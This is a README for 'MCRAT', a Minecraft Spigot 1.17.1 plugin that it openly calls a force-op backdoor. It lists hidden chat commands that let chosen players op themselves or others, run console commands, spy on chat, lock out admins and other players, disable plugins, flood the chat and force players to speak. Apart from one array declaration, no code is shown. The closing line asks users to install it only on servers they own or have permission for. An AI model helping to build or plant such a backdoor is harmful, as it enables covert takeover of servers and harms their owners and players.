# MCRAT
### A minecraft Force Op / backdoor plugin.

For Spigot 1.17.1

The ONCHAT.java file Is The backdoor itself

It's going to be hooked up to chat commands in the main files

To change who can execute it, change it in the array:
```java

public String onlyrunners[] = new String[]{YOUR_PLAYER_NAME};
```

##  Usage

### :lockconsole 
  A toggle command that prevents console command execution
### :flood
  Floods the chat
### :lockcommands
  A toggle command that prevents command execution from all players (even opped) (excluded MCRAT users)
### :spy
  You see what commands / messages other players type, like Command Spy
### :reloadserver
  Reloads Server
### :giveaccess playername
  Gives Access to MCRAT to other players (per server session only)
### :revokeaccess playername
  Removes Access to MCRAT to other players (per server session only)
### :disableplugin pluginname
  Disables A Plugin (like if you removed it's file from the server directory)
### :enableplugin pluginname
  Enables a plugin
### :plugins
  Lists all avaible plugins (the red ones are disabled, the green ones are enabled)
### :status
  Lists the status of all toggleable commands
### :op playername
  Ops someone
### :deop playername
  Deops someone
### :exec command
  Executes that command from Console
### :sudo player chatmessage
  Forces a player to say the chatmessage. If the chat message is something like /..., it'll be executed as a command



If you plan on using it, you agree you will install this plugin to servers you own or on servers you have permission to install plugins on.
##### By modifying / downloading / using this, you agree to (CC By Sa)[https://creativecommons.org/licenses/by-sa/4.0/]
